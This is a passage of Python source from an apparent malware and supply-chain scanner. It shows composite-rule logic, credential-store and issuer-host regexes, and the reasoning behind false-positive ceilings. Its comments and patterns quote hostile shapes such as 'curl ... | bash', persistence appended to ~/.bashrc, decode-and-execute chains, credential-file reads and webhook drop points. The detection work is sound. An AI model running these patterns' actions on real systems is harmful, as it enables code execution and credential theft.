        fired: frozenset[str] = frozenset(),
        in_ci: bool = False,
        in_consumer: bool = False,
    ) -> bool:
        """Evaluate a composite expression against the capabilities present.

        Supports ``all``, ``any``, nested combinations, and ``unless``. Kept
        deliberately small: a composite rule is read by somebody deciding whether
        a security finding is justified, and an expression language rich enough
        to be clever is one nobody can review.
        """
        match = compiled.match
        counts = counts if counts is not None else Counter(present)

        if match.all_of and not all(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.all_of
        ):
            return False
        if match.any_of and not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.any_of
        ):
            return False
        return not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.unless
        )

    def _term(
        self,
        term: object,
        present: set[Capability],
        *,
        path: str | None = None,
        in_hook: bool = False,
        in_ci: bool = False,
        in_consumer: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
    ) -> bool:
        if not isinstance(term, dict):
            return False

        if "capability" in term:
            try:
                capability = Capability(str(term["capability"]))
            except ValueError:
                return False
            required = term.get("at_least")
            if required is None:
                return capability in present
            # Depth, not presence. `decode` twice in one file is a decode
            # chain -- base64 into decompress into execute -- and that is a
            # stronger claim than decoding once, because a single decode has
            # ordinary uses and stacking them has none.
            observed = (counts or Counter(present))[capability]
            return observed >= int(required)

        # A named indicator rather than a capability.
        #
        # Some evidence is not a behaviour, it is a destination: posting to a
        # Discord webhook and posting to a metrics endpoint are both `egress`,
        # and the capability model deliberately cannot tell them apart. This
        # term lets a composite say "that specific rule fired" without
        # inventing a capability for every indicator, which is what would
        # otherwise happen and would dilute the primitives until they meant
        # nothing.
        if "rule" in term:
            return str(term["rule"]) in fired

        if "any" in term:
            return any(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["any"] or ()
            )

        if "all" in term:
            return all(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["all"] or ()
            )

        # The negation of a term.
        #
        # `unless` already refuses a composite by path, and that is the only
        # thing this model could say "not" about. The case that needed more:
        # `SUSPECT.DECODE_EXEC.001` pairs a decode with a process start, and in
        # shell every command is a process -- so `key=$(echo "$b" | base64 -d)`,
        # which is how a shell script decodes anything at all, matched a rule
        # whose message says the decoded value was executed. The primitive is
        # right and it is not evidence of that claim in that one language, which
        # is a statement about a specific capability rule rather than about a
        # path or a context.
        if "not" in term:
            return not self._term(
                term["not"],
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )

        if "path_glob" in term and path is not None:
            from cordon_scanner.foundation.files.globs import PathGlob

            entry = getattr(self, "_in_entry", False) or getattr(self, "_in_import_entry", False)
            return not entry and PathGlob.in_package(path, str(term["path_glob"]))

        # Execution context as a first-class term.
        #
        # This is what lets a rule say "credential access plus network egress,
        # in an install hook" without also requiring an execution primitive. In
        # application code that pairing needs a third signal to be meaningful,
        # because reading configuration and calling an API is what an
        # application does all day. In an install hook it does not: the hook IS
        # the execution, so the pair alone is already the whole attack.
        if "context" in term:
            named = str(term["context"])
            if named == "install_hook":
                return in_hook
            if named == "ci_hook":
                return in_ci
            if named == "consumer_install":
                return in_consumer
            if named == "install_entry":
                return in_hook and getattr(self, "_in_entry", False)
            if named == "import_entry":
                return getattr(self, "_in_import_entry", False)
            return False

        return False

    @staticmethod
    def _capabilities_of(compiled: CompiledRule) -> tuple[Capability, ...]:
        """Every capability named anywhere in a composite expression."""
        found: list[Capability] = []

        def walk(term: object) -> None:
            if not isinstance(term, dict):
                return
            if "capability" in term:
                with suppress(ValueError):
                    found.append(Capability(str(term["capability"])))
            for key in ("all", "any"):
                for nested in term.get(key) or ():
                    walk(nested)

        for term in (*compiled.match.all_of, *compiled.match.any_of):
            walk(term)
        return tuple(dict.fromkeys(found))

    #: How much of the finding each capability carries, most specific first.
    #: A compound primitive names the whole act by itself -- `fetch_exec` IS
    #: "the download is the interpreter's input" -- while `egress` and `spawn`
    #: are the two that appear in ordinary code constantly.
    ANCHOR_SPECIFICITY: ClassVar[tuple[Capability, ...]] = (
        Capability.FETCH_EXEC,
        Capability.DESERIALIZE,
        Capability.EXECUTE,
        Capability.DYNAMIC_DISPATCH,
        Capability.WALLET,
        Capability.MINE,
        Capability.CREDENTIAL,
        Capability.PERSIST,
        Capability.DESTROY,
        Capability.ANTI_ANALYSIS,
        Capability.TARGETING,
        Capability.DECODE,
        Capability.DECOMPRESS,
        Capability.RECONNAISSANCE,
        Capability.DELAY,
        Capability.SPAWN,
        Capability.EGRESS,
    )

    @staticmethod
    def _anchor(
        matched: tuple[Capability, ...],
        by_capability: dict[Capability, CapabilityHit],
        hits: list[CapabilityHit],
    ) -> CapabilityHit:
        """Where to point the finding.

        The hit that carries the most of the claim, and the earliest of those.

        This was the earliest hit of any named capability, on the reasoning that
        the first contributing line puts the reader at the start of the
        construct. That holds when the capabilities ARE one construct, and
        `curl ... | bash` -- where every capability is on the one line -- still
        anchors exactly where it did. It fails at the proximity a composite
        allows: `SUSPECT.DROPPER.001` pairs hits up to two hundred lines apart,
        so the earliest is routinely nowhere near the evidence.

        Of sixteen DROPPER findings sampled from the corpus, eight pointed
        somewhere misleading. milvus showed `PWD := $(shell pwd)` on line 13 for
        a `curl | sh` on 143; hiddify showed `ifeq ($(shell uname),Darwin)` on
        34 for one on 162; community-scripts showed twelve lines of figlet ASCII
        ART for a `source <(curl ...)` ten lines below it. Every one of those
        findings was CORRECT, and every one of them reads as a tool that does
        not know what it is looking at -- which is the more expensive failure,
        because a false positive is argued with and this is simply disbelieved.
        """
        relevant = [by_capability[c] for c in matched if c in by_capability]
        order = CapabilityDetector.ANCHOR_SPECIFICITY

        def rank(hit: CapabilityHit) -> int:
            try:
                return order.index(hit.capability)
            except ValueError:
                # A primitive nobody has graded yet sorts between the compound
                # ones and the two broad ones, rather than winning by accident.
                return len(order) - 2

        return min(relevant or hits, key=lambda h: (rank(h), h.byte_start))

    MIN_IDIOM_BYTES = 40
    """How long the shared construct must be to be worth grouping on.

    The same forty bytes `Engine.MIN_IDIOM_SNIPPET` uses, and for its reason:
    `cidr_blocks = ["0.0.0.0/0"]` is twenty-seven and hashes the same in a
    hundred unrelated modules.
    """

    @classmethod
    def _with_idiom_key(
        cls,
        evidence: Evidence,
        content: FileContent,
        matched: tuple[Capability, ...],
        hits: list[CapabilityHit],
    ) -> Evidence:
        """Carry a second hash: the one `ResultFolding.idiom` groups on.

        Those two questions had one answer and they are not the same question.
        The evidence should point at the hit that carries the claim -- that is
        what `_anchor` is for, and why `community-scripts/ProxmoxVE` stopped
        being shown twelve lines of figlet ASCII art. The COLLAPSE has to group
        on the part that is shared, which is the generic half: six hundred of
        that repository's container scripts open with a byte-identical
        `source <(curl -fsSL .../build.func)`, and that line is what makes them
        one decision applied six hundred times rather than six hundred findings.

        Keying the collapse on the evidence meant moving the anchor silently
        switched the collapse off: its persistence findings went from one to
        twenty-seven in a single pass, which is how this was noticed at all.

        So the anchor stays the most specific hit and this is the broadest one.
        Absent when the shared construct is too short to be specific, which is
        the same condition the collapse applies to a snippet.
        """
        broadest = cls._broadest(matched, hits)
        if broadest is None:
            return evidence
        raw = content.raw[broadest.byte_start : broadest.byte_end]
        if len(raw) < cls.MIN_IDIOM_BYTES:
            return evidence
        metadata = dict(evidence.metadata)
        metadata["idiom_hash"] = Evidence.hash_bytes(raw)
        return replace(evidence, metadata=tuple(sorted(metadata.items())))

    @classmethod
    def _broadest(
        cls, matched: tuple[Capability, ...], hits: list[CapabilityHit]
    ) -> CapabilityHit | None:
        """The least specific contributing hit -- the mirror of `_anchor`."""
        order = cls.ANCHOR_SPECIFICITY
        wanted = set(matched)
        relevant = [h for h in hits if h.capability in wanted] or hits
        if not relevant:
            return None

        def rank(hit: CapabilityHit) -> tuple[int, int]:
            try:
                index = order.index(hit.capability)
            except ValueError:
                index = len(order) - 2
            return (-index, hit.byte_start)

        return min(relevant, key=rank)

    #: Credentials whose issuer is known, and the hosts that issue them.
    #:
    #: Sending a service's own token to that service is authentication. It is
    #: what the token is FOR, it happens in every CI script and packaging script
    #: that reads a private repository, and it gives an attacker nothing: the
    #: host already knows the credential.
    ISSUER_HOSTS: ClassVar[tuple[tuple[tuple[bytes, ...], tuple[bytes, ...]], ...]] = (
        ((b"GITHUB_TOKEN", b"GH_TOKEN", b"GITHUB_PAT"), (b"github.com", b"githubusercontent.com")),
        ((b"GITLAB_TOKEN", b"CI_JOB_TOKEN"), (b"gitlab.com",)),
        ((b"NPM_TOKEN", b"NODE_AUTH_TOKEN"), (b"registry.npmjs.org", b"npmjs.com")),
        ((b"PYPI_TOKEN", b"TWINE_PASSWORD"), (b"pypi.org", b"files.pythonhosted.org")),
        ((b"CARGO_REGISTRY_TOKEN",), (b"crates.io",)),
        ((b"DOCKER_TOKEN", b"DOCKERHUB_TOKEN"), (b"docker.io", b"index.docker.io")),
        ((b"AWS_SECRET_ACCESS_KEY", b"AWS_SESSION_TOKEN"), (b"amazonaws.com",)),
    )

    HOST_IN_URL = re.compile(rb"https?://([A-Za-z0-9._-]{4,253})")

    #: A credential store, and the clients that store exists to serve.
    STORE_CLIENTS: ClassVar[tuple[tuple[re.Pattern[bytes], re.Pattern[bytes]], ...]] = (
        (
            re.compile(rb"\.ssh[/\\\"', ]"),
            re.compile(
                rb"paramiko|SSHClient|asyncssh|\bssh2\b|x/crypto/ssh|\bssh\.(?:Dial|NewClient)\b"
                rb"|SSH_AUTH_SOCK|net\.Dial\(\s{0,4}\"unix\"|\brsync\b|\bscp\b|\bsftp\b|Net::SSH|JSch"
            ),
        ),
        (
            re.compile(rb"\.aws[/\\]"),
            re.compile(rb"boto3|botocore|aws-sdk|@aws-sdk|Aws::|AWSSDK|amazonaws\.com"),
        ),
        (
            re.compile(rb"\.config/gcloud|application_default_credentials"),
            re.compile(rb"google\.auth|googleapis\.com|google-auth|@google-cloud"),
        ),
        (
            re.compile(rb"\.azure[/\\]"),
            re.compile(
                rb"azure\.identity|@azure/|management\.azure\.com|login\.microsoftonline\.com"
            ),
        ),
        (
            re.compile(rb"\.pypirc"),
            re.compile(rb"\btwine\b|upload\.pypi\.org|test\.pypi\.org"),
        ),
    )

    @classmethod
    def _store_used_by_its_own_client(
        cls, content: FileContent, window: list[CapabilityHit]
    ) -> bool:
        """Whether a credential store here is read only by the client it belongs to.

        A deploy tool loads `~/.ssh/id_ed25519` into paramiko and connects; an S3 helper lets
        boto3 read `~/.aws/credentials`. The key goes where it authenticates, which is what it
        is for (review 98: SSH and cloud tools blocked by `SUSPECT.EXFIL.CREDENTIAL_STORE.001`).
        Every store named must belong to a family here, and EVERY outbound call in the window
        must be that family's client: a stealer that reads the same file and posts it with
        `requests` or a raw socket is untouched, as is a browser's cookie store, which has no
        client but the browser.
        """
        stores = [h for h in window if h.rule_id == "CAP.CREDENTIAL.STORE.001"]
        egress = [h for h in window if h.capability is Capability.EGRESS]
        if not stores or not egress:
            return False
        families: list[re.Pattern[bytes]] = []
        for hit in stores:
            text = content.raw[max(0, hit.byte_start - 2) : hit.byte_end + 2]
            client = next((c for store, c in cls.STORE_CLIENTS if store.search(text)), None)
            if client is None:
                return False
            families.append(client)
        return all(
            any(
                client.search(content.raw[hit.byte_start : hit.byte_end + 40])
                for client in families
            )
            for hit in egress
        )

    @classmethod
    def _credential_reaches_its_own_issuer(
        cls, content: FileContent, window: list[CapabilityHit]
    ) -> bool:
        """Whether every credential here is being sent to the host that issued it.

        `vllm`'s `setup.py` asks GitHub which commit `main` is on, and
        authenticates so the request is not rate-limited:

            github_token = os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))
            curl_cmd += ["-H", f"Authorization: token {github_token}"]

        A credential read, an outbound request, and an install-time context --
        `MALWARE.EXFIL.001` at CRITICAL, in the MALICIOUS category, telling the
        reader to treat their host as compromised. `pytorch`'s `torch/hub.py`
        does the same thing for the same reason.

        Nothing is exfiltrated. The host being contacted is the one that issued
        the token, already knows it, and is the only party the token is good
        against. This is what the credential is for.

        Narrow on purpose, and in the safe direction: it takes effect only when
        EVERY host named in the window belongs to the issuer of EVERY credential
        named in it. A payload that reads `GITHUB_TOKEN` and posts it anywhere
        else names another host and is untouched -- which is the whole attack
        this rule exists to catch.
        """
        if not window:
            return False
        lines = content.line_starts
        first = min(h.byte_start for h in window)
        last = max(h.byte_end for h in window)
        del lines
        text = content.raw[first:last]
        if not text:
            return False

        hosts = {m.group(1).lower() for m in cls.HOST_IN_URL.finditer(text)}
        if not hosts:
            return False

        issuers: list[tuple[bytes, ...]] = []
        for names, owned in cls.ISSUER_HOSTS:
            if any(name in text for name in names):
                issuers.append(owned)
        if not issuers:
            return False

        def owned_by_some_issuer(host: bytes) -> bool:
            return any(
                host == owner or host.endswith(b"." + owner) for owned in issuers for owner in owned
            )

        return all(owned_by_some_issuer(host) for host in hosts)

    def _composite_finding(
        self,
        compiled: CompiledRule,
        unit: FileUnit,
        ctx: ScanContext,
        anchor: CapabilityHit,
        matched: tuple[Capability, ...],
        hits: list[CapabilityHit],
        *,
        file_hits: list[CapabilityHit] | None = None,
    ) -> Finding | None:
        rule = compiled.rule
        content = unit.content
        # A prebuilt binary from the package's own release, checked against a digest it ships
        # before anything runs (review 98, FP-2: `@ohos-ports/larksuite-cli`). Read over the whole
        # file's hits, not this window's: a credential read anywhere in it keeps the dropper.
        verified = (
            rule.id in self.VERIFIABLE_DROPPERS
            or rule.id == self.REMOTE_CODE_RULE
            or rule.id in self.WITHDRAWN_WHEN_VERIFIED
        ) and self._verified_release_download(unit, ctx, hits if file_hits is None else file_hits)

        mode = Redactor.effective_mode(rule.evidence_policy, ctx.config.evidence)
        evidence = Redactor.build_evidence(content, anchor.byte_start, anchor.byte_end, mode)
        evidence = self._with_idiom_key(evidence, content, matched, hits)

        present = {h.capability for h in hits}
        in_hook = ctx.in_install_hook(content.path)
        if (
            in_hook
            and rule.id == self.DROPPER_RULE
            and SourcePaths.is_editor_extension(content.path)
            and not LoadPath.runs_a_downloaded_file(hits)
        ):
            # An extension's activation entry is in the install-hook set so that a beacon there is
            # reported as one; a download it then starts is how extensions fetch their own tools,
            # and is not escalated as an install-time dropper. See `MALWARE.DROPPER.001` above.
            in_hook = False
        if rule.id in self.CONTEXT_FREE:
            in_hook = False
        no_download_runs = rule.id in self.VERIFIABLE_DROPPERS and (
            in_hook and CapabilityDetector._tool_runs_nothing_downloaded(unit, ctx)
        )
        if no_download_runs and rule.id == self.DROPPER_RULE:
            # An agent's tool that never runs what it fetched is not escalated as an install-time
            # dropper; `SUSPECT.DROPPER.001` reports the pair below the gate.
            in_hook = False
        if verified and rule.id in (self.DROPPER_RULE, self.REMOTE_CODE_RULE):
            # Not escalated as an install-time dropper either: the hook escalation would put the
            # span straight back at CRITICAL. The ceiling below says why it is still reported.
            in_hook = False

        severity = RiskScorer.apply_category_floor(rule.category, rule.severity)
        category = rule.category
        escalations: list[str] = []

        # Test material and documentation get a severity ceiling, the way the secrets
        # detector has always given them one. The composites had none, so a file
        # written to demonstrate a dangerous pattern was reported as though it were
        # one in production.
        #
        # `bandit/examples/marshal_deserialize.py` is the clearest case: a file whose
        # entire purpose is to be an example of unsafe deserialisation, in a security
        # tool's `examples/` directory, reported at HIGH as decode-and-execute. It is
        # not wrong about what the file does. It is wrong about what a reader should
        # do next. The same applies to Airflow's, pydantic's and scrapy's test files,
        # which were four of nineteen findings from one rule across eighteen
        # repositories.
        #
        # A ceiling and not a suppression, and the ordering matters: the install-hook
        # escalation below is applied AFTER, so a payload in a file that happens to sit
        # under `tests/` and runs at install time still reaches CRITICAL. The ceiling
        # is about where a pattern was written, and the hook is about when it runs.
        #
        # MALICIOUS is never ceilinged. A dropper in a fixture directory is still a
        # dropper, and "we have not fixed this yet" is not a coherent position to hold
        # about evidence of intent - which is the same reasoning the baseline applies.
        # A MALICIOUS claim about a CI script needs the fetch to be opaque.
        #
        # The composite admits `ci_hook` alongside `install_hook`, correctly: a
        # compromised pipeline running what it downloaded is a real, observed attack.
        # But an install hook runs on every consumer's machine, unprompted, while a CI
        # script runs only in the pipeline the project controls -- so for CI the
        # category rests entirely on the fetch being unreviewable, and a pinned one is
        # not.
        #
        # Withdrawn rather than demoted, and the rule id is why. `MALWARE.DROPPER.001`
        # reported with `category: suspicious` is self-contradictory: the id namespace
        # encodes the category, a consumer filtering on `MALWARE.*` gets it anyway, and
        # the taxonomy derives a threat domain from the prefix. The first attempt at
        # this demoted the category and left the id, which produced exactly that.
        #
        # Nothing is lost by withdrawing it. `SUSPECT.DROPPER.001` fires on the same
        # span, at a severity the evidence supports, with remediation a maintainer can
        # act on - copy the script into the repository, or verify a digest. What stops
        # being said is "treat the host as compromised and report the package to the
        # registry", which is advice about a package somebody installed and means
        # nothing to the owner of a `.buildkite` script.
        if compiled.rule.id in self.EXFIL_RULES and self._credential_for_its_own_service(content):
            return None

        if (
            compiled.rule.id == self.BEACON_RULE
            and content.path in ctx.agent_run_paths
            and content.path not in ctx.consumer_install_paths
            and not self._identity_in_what_is_sent(
                unit.language, content, hits if file_hits is None else file_hits
            )
        ):
            # An agent's tool is in the install-hook set so that what it does is graded as code
            # that runs unasked; an API client that names its platform in a User-Agent near its
            # request is not a beacon. As the import-time beacon `SUSPECT.EXFIL.BEACON.001`
            # requires, the machine's identity has to be IN what is sent (review 98: Asana,
            # Notion, search and transcription clients in MalSkillBench were blocked on nearness
            # alone). Where no flow is read for the language, nearness still decides.
            return None

        if (
            compiled.rule.id == "MALWARE.DROPPER.001"
            and SourcePaths.is_editor_extension(content.path)
            and not LoadPath.runs_a_downloaded_file(hits)
        ):
            # Withdrawn for the reason above. An extension's activation entry runs unasked, as an
            # install hook does -- which is what catches a beacon there -- but an extension that
            # fetches and starts its own tools (Codespaces, APKLab, DOSBox) is not a compromised
            # host. `SUSPECT.DROPPER.001` reports the same span, below the gate. A download
            # written to an executable and started keeps this rule: that is the malicious shape.
            return None

        if no_download_runs and compiled.rule.id == "MALWARE.DROPPER.001":
            # Withdrawn for the reason above: no byte the script downloads is executed, made
            # executable, or evaluated (`detect/download_flow.py`). `SUSPECT.DROPPER.001` reports
            # the same pair below the gate, and every other rule over the file still applies.
            return None

        if (
            verified
            and compiled.rule.id in self.WITHDRAWN_WHEN_VERIFIED
            and self._suspect_dropper_reports(
                ctx, content.path, hits, self.WITHDRAWN_WHEN_VERIFIED[compiled.rule.id]
            )
        ):
            # Withdrawn for the reason above, and only where `SUSPECT.DROPPER.001` reports the same
            # span, so the file is never left clean. What is withdrawn is the claim that the content
            # is whatever the host serves: the release URL is a literal, and the digest it is held
            # to came with the package. What is not withdrawn is the question of what the binary
            # is -- whoever owns the repository owns the release and the checksum too (`08` P3) --
            # so it stays reported at MEDIUM, and every other rule over the file still applies.
            return None

        if rule.id == "MALWARE.EXFIL.BEACON.001" and CapabilityDetector._loopback_only(
            CapabilityDetector._satisfying_region(content, hits)
        ):
            # A daemon's health check on its own port: what reaches 127.0.0.1 never leaves the
            # machine, so it carries nothing anywhere (review 98, FP-3: aigentry-telepty). Any
            # other host or URL in the region keeps the rule.
            return None

        if (
            in_hook
            and rule.id == self.PERSIST_RULE
            and CapabilityDetector._is_formula(content)
            and not CapabilityDetector._writes_near(content, hits)
            and not CapabilityDetector._writes_near(
                content, hits, writes=CapabilityDetector.RUBY_WRITE
            )
        ):
            # A Homebrew formula's `install` and `post_install` run in brew's build sandbox, which
            # lets them write only under the prefix: a formula cannot plant a login item, so it has
            # to be seen writing one. What a formula names is the user's profile in its caveats or
            # `desc`, a LaunchAgent it unloads, an `etc/profile.d` under its own prefix (review 98:
            # 27 formulas in one tap). A cask runs unsandboxed and keeps the rule.
            return None

        if in_hook and SourcePaths.is_editor_extension(content.path):
            # The same reasoning, for the two rules a coding extension trips by talking: its help
            # text names `~/.zshrc` and its secret redactor names `hooks.slack.com`, megabytes of
            # bundle away from any write or request (review 98). In an extension the persistence
            # has to be written and the drop point reached; `SUSPECT.*` still reports the span.
            if rule.id == self.PERSIST_RULE and not CapabilityDetector._writes_near(content, hits):
                return None
            if rule.id == self.CALLBACK_RULE and not any(
                # A request, not the destination's name: the drop point is itself an egress hit.
                h.capability is Capability.EGRESS and not h.rule_id.startswith("INTEL.")
                for h in hits
            ):
                return None

        if (
            category is Category.MALICIOUS
            and not in_hook
            and ctx.in_ci_hook(content.path)
            and CapabilityDetector.PINNED_FETCH.search(
                CapabilityDetector._satisfying_region(content, hits)
            )
        ):
            return None

        if (
            rule.id == "MALWARE.EXFIL.001"
            and CapabilityDetector._agent_run(content, ctx)
            and not CapabilityDetector._names_untrusted_destination(content.raw)
            and not CapabilityDetector._ENVIRONMENT_DUMP.search(content.raw)
        ):
            # A skill's script or an MCP server's handler calling the service it holds a key for
            # is what such a tool is for; at install level it blocked 125 of MalSkillBench's 4,000
            # benign skills (review 98). `SUSPECT.EXFIL.001` still records the pair, and a credential
            # store, a drop point, a beacon or a callback is each its own composite.
            return None

        agent_tool_client = False
        ceilinged = ""
        ceiling = FIXTURE_CEILING
        # Nothing below excuses a file that hid its payload.
        #
        # Every ceiling in the chain makes one argument in different words: this
        # is not really code somebody wrote to run. Test material, documentation,
        # generated output, a vendored library, a minified bundle -- each says
        # "read it somewhere else, or do not read it at all". A run of thousands
        # of invisible characters defeats all of them at once, because none of
        # those things contains one and the only reason to write one is so that a
        # reader does not see it.
        #
        # `@aifabrix/miso-client` needed this. Its payload is 9,123 consecutive
        # variation selectors in `dist/express/error-types.js`, `eval`ed a few
        # lines later. `dist/` is generated output, so the finding came out at
        # MEDIUM and a gate passed it -- the second time in this release a noise
        # ceiling was found holding real malware below the line, after
        # `_is_minified` and the obfuscated Python it excused.
        smuggled = any(hit.rule_id == "CAP.INVISIBLE_SMUGGLING.001" for hit in hits)
        if category is not Category.MALICIOUS and not smuggled:
            hand_run_provisioning = (
                Capability.PERSIST in matched
                and not in_hook
                and not ctx.in_ci_hook(content.path)
                and not ctx.in_consumer_install(content.path)
                and CapabilityDetector._is_hand_run_provisioning(content.path, unit.language)
                # A skill's script is run by the agent whenever the skill is invoked.
                and not LoadPath.skill_script(content.path, ctx)
                and not CapabilityDetector._persists_a_download(content, hits)
            )
            # The credential-egress-execution combination outside anything that runs on its own:
            # a client reading its own key and calling its own service, a deploy script, the
            # Maven wrapper. The composite's message already says it is "a combination to be
            # aware of rather than evidence of anything"; in the long tail it was the only code
            # warning on 259 of 11,005 benign units rescanned, while in 4,269 malware samples it
            # blocked none alone (review 98). Recorded -- unless the file also names a
            # destination nobody sends their own credentials to.
            trusted_destination = not CapabilityDetector._names_untrusted_destination(
                content.raw
            ) and not CapabilityDetector._ENVIRONMENT_DUMP.search(content.raw)
            own_credential_client = (
                compiled.rule.id == "SUSPECT.EXFIL.001"
                and not in_hook
                and not ctx.in_ci_hook(content.path)
                and not ctx.in_consumer_install(content.path)
                and not LoadPath.skill_script(content.path, ctx)
                and not SourcePaths.is_editor_extension(content.path)
                and trusted_destination
            ) or (
                # A skill's script or an MCP server's handler calling the service it was given a
                # key for: agent-run code, graded as install-time for what no tool needs, but a
                # credential sent to an ordinary API is what such a tool is for. Graded at
                # install level, 125 of MalSkillBench's 4,000 benign skills were blocked for it
                # (review 98). A drop point, a raw address or the whole environment still is not;
                # nor is a credential store, a beacon or a drop point, each its own composite.
                compiled.rule.id in ("SUSPECT.EXFIL.001", "MALWARE.EXFIL.001")
                and CapabilityDetector._agent_run(content, ctx)
                and trusted_destination
            )
            # Not raised back by the install escalation below: agent-run code is in the install
            # set for what no tool needs, and this is what a tool is for.
            agent_tool_client = own_credential_client and CapabilityDetector._agent_run(
                content, ctx
            )
            # A shell, PowerShell, Vagrant, Docker, Nix or patch file that enables a service,
            # writes a unit or appends `export PATH=...` to `~/.bashrc` is provisioning a person
            # runs, persisting configuration rather than anything it fetched. In the long tail
            # that was 400 shell scripts among 769 benign units with this finding; in 4,269
            # malware samples it sat in such a file once, beside rules that block it anyway --
            # the malware's persistence is JavaScript, 564 samples (review 98). Recorded. What
            # persists a download (`curl ... >> ~/.bashrc`, a cron entry running `wget`, a
            # variable filled by `$(curl ...)` and appended to a profile) keeps its grade.
            if Capability.PERSIST in matched and SampleKinds.is_machine_provisioning(
                content.raw, content.path
            ):
                # A script that installs operating-system packages is provisioning a
                # machine, and provisioning a machine IS fetching software and
                # arranging for it to keep running. `ViktorUJ/cks` supplied twenty-one
                # of these -- download kubectl, write a kubelet drop-in, enable the
                # unit, append completion to `.bashrc` -- and
                # `stacksimplify/terraform-on-aws-ec2` seventy-seven copies of `yum
                # install httpd` plus `systemctl enable httpd`.
                #
                # Only the persistence composites, and deliberately so. A dropper is
                # not excused by the same reasoning: piping an unpinned remote script
                # into a shell is a choice a provisioning script still has to answer
                # for, and it is how the one real supply-chain exposure in this corpus
                # works. Nor does this reach an install hook, where the ceiling is
                # applied before the hook escalation and the hook still raises the
                # finding to critical -- which is the case where writing somebody
                # else's cron entry is the attack rather than the installation.
                ceilinged = "a script that provisions a machine"
                if hand_run_provisioning:
                    ceiling = Severity.LOW
            elif hand_run_provisioning:
                ceilinged = "a provisioning script a person runs, persisting configuration"
                ceiling = Severity.LOW
            elif own_credential_client:
                ceilinged = "code a person or a program calls, with no destination of concern"
                ceiling = Severity.LOW
            elif (
                compiled.rule.id == self.CREDENTIAL_STORE_RULE
                and SampleKinds.names_authentication(content.path)
            ):
                # A file named for authentication, reading a credential store. See
                # `core.samples.names_authentication`; scoped to this one rule, because
                # its premise is a store "this component does not own".
                ceilinged = "a file whose name says it handles authentication"
            elif (
                compiled.rule.id == self.CREDENTIAL_STORE_RULE
                and not in_hook
                and not ctx.in_consumer_install(content.path)
                and not CapabilityDetector._agent_run(content, ctx)
                # Nor code a published package runs when it is imported (REC-2).
                and content.path not in ctx.import_entry_paths
                # A paste site, a webhook, a chat API or a bare address beside the store keeps
                # it: nobody sends their own keys there, whatever this test can follow.
                and not CapabilityDetector._names_untrusted_destination(content.raw)
                and not CapabilityDetector._CHAT_CLIENT.search(content.raw)
                and not StoreFlow.reaches(
                    content.text,
                    [h.line for h in hits if h.rule_id == "CAP.CREDENTIAL.STORE.001"],
                    [h.line for h in hits if h.capability is Capability.EGRESS],
                )
            ):
                # Nothing the file reads from the store reaches the call (`detect/store_flow.py`):
                # a dotfiles installer reading `~/.ssh/config` and running `curl | bash` forty
                # lines on. Where code runs on its own -- a hook, an agent's tool -- reading
                # somebody's keys is the act, and this does not apply.
                ceilinged = "a credential store read with nothing it reads sent anywhere"
            elif content.is_rule_material:
                # A rule set, or a test case annotated for one. `semgrep/semgrep-rules`
                # supplies `bash/curl/security/curl-eval.bash`, whose whole content is
                # the capability pair the rule next to it matches. See `core.samples`.
                ceilinged = "another analyser's rule material"
                ceiling = RULE_MATERIAL_CEILING
            elif SourcePaths.is_test_material_here(content.path, ctx):
                ceilinged = "test material"
            elif (
                compiled.rule.id in InertLiterals.CAP
                and not in_hook
                and not ctx.in_consumer_install(content.path)
                and not CapabilityDetector._agent_run(content, ctx)
                and InertLiterals.all_inert(
                    content.path,
                    content.text,
                    content.raw,
                    [
                        (h.byte_start, h.byte_end, h.line)
                        for h in hits
                        if h.capability is InertLiterals.CAP[compiled.rule.id]
                    ],
                )
            ):
                # A command-shaped string that is only data (census D: launchpromptly's
                # redteam/attacks.py, cord-engine's demo.py): InertLiterals proves it reaches no
                # spawn, exec, sender or write. A MALICIOUS form never reaches this cascade.
                ceilinged = "a command-shaped string that reaches no sink"
                ceiling = Severity.LOW
            elif SourcePaths.is_documentation(content.path):
                ceilinged = "documentation"
                if TextPosition.is_prose(content.path):
                    # Prose, which nothing runs: a README's `curl ... | sh` is an instruction to
                    # a person. In the long tail, documentation and Python package metadata were
                    # 79 of 278 benign units warned by `SUSPECT.DROPPER.001` alone, and none of
                    # 4,269 malware samples had a dropper finding in prose (review 98). A
                    # file merely under `docs/` -- Sphinx's `conf.py` -- keeps the ceiling above.
                    ceiling = Severity.LOW
            elif (
                SourcePaths.is_build_tooling(content.path)
                and Capability.FETCH_EXEC not in present
                # Nor a wallet's secret sent out: a build that ships it, ships it.
                and not CapabilityDetector._sends_a_wallet_secret(hits)
                # A published npm package's `build/` and `bin/` are what runs, not what builds.
                and not CapabilityDetector._shipped_output(content.path, ctx)
                # Nor when it wipes the machine: a build script that deletes `$HOME` or `/`
                # runs on every machine that builds, exactly as a piped download does.
                and compiled.rule.id not in CapabilityDetector.DESTRUCTION_RULES
                # A skill's `scripts/` folder is not the project's tooling: the agent runs
                # what is in it whenever the skill is invoked.
                and not LoadPath.skill_script(content.path, ctx)
            ):
                # Unless the file PIPES the network into an interpreter. The ceilings
                # here all rest on one claim -- that a pattern in these paths is
                # "usually written to be read rather than run" -- and a build recipe is
                # the one place where that is false: `curl ... | sh` in a Makefile runs
                # on every machine that builds the project. Without this the
                # `make-fetch-exec` corpus sample, whose entire content is that line,
                # came out at MEDIUM.
                ceilinged = "the project's own build and release tooling"
            elif (
                compiled.rule.id == self.DROPPER_RULE
                and SourcePaths.is_editor_extension(content.path)
                and not LoadPath.runs_a_downloaded_file(hits)
            ):
                # An extension fetching and starting its own tools -- a language server, a CLI,
